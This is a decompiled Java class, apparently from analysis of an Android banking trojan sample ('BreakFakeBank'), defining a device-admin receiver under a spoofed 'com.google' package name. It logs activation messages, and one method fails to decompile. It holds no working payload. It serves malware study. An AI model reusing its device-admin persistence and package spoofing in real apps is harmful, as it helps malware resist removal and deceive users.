package com.google.bps.bfcfc;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class LockReceiver extends DeviceAdminReceiver {
  public void onDisabled(Context paramContext, Intent paramIntent) {
    System.out.println("取消激活");
    super.onDisabled(paramContext, paramIntent);
  }
  
  public void onEnabled(Context paramContext, Intent paramIntent) {
    System.out.println("激活使用");
    super.onEnabled(paramContext, paramIntent);
  }
  
  public void onReceive(Context paramContext, Intent paramIntent) {
    throw new VerifyError("bad dex opcode");
  }
}


/* Location:              /home/fahim/Desktop/BreakFakeBank-dex2jar.jar!/com/google/bps/bfcfc/LockReceiver.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */